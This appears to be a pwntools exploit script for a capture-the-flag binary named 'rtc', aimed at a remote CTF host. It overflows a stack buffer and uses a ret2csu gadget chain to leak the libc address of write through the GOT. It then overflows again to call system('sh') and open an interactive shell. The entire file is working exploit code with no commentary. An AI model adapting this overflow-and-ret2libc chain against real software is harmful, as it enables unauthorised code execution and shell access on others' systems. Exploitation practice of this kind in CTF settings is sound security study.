from pwn import *

#p = process('./rtc')
p = remote('ctf.j0n9hyun.xyz', 3025)
e = ELF('./rtc')
l = e.libc

context.log_level = "debug"

main = 0x00000000004005F6
csu_p_rbx = 0x00000000004006ba
csu_fun = 0x00000000004006A0
stdin = 0x0000000000601050
p_r = 0x00000000004006c3

def fun(f, arg1, arg2, arg3):
	pay = p64(csu_p_rbx)
	pay += p64(0)
	pay += p64(1)
	pay += p64(f)
	pay += p64(arg3)
	pay += p64(arg2)
	pay += p64(arg1)
	pay += p64(csu_fun)
	pay += p64(0) * 7
	return pay


pause()
payload = 'a' * 0x40 + 'b' * 8
payload += fun(e.got['write'], 1, e.got['write'],6)
payload += p64(main)

p.sendline(payload)
p.recvuntil('\x0a')

libc = u64(p.recv(6).ljust(8,'\x00')) - l.sym['write']
log.info('libc : ' + hex(libc))

payload = 'a' * 0x40 + 'b' * 8
payload += p64(p_r)
payload += p64(libc + next(l.search('sh\x00')))
payload += p64(libc + l.sym['system'])

p.sendline(payload)
p.interactive()
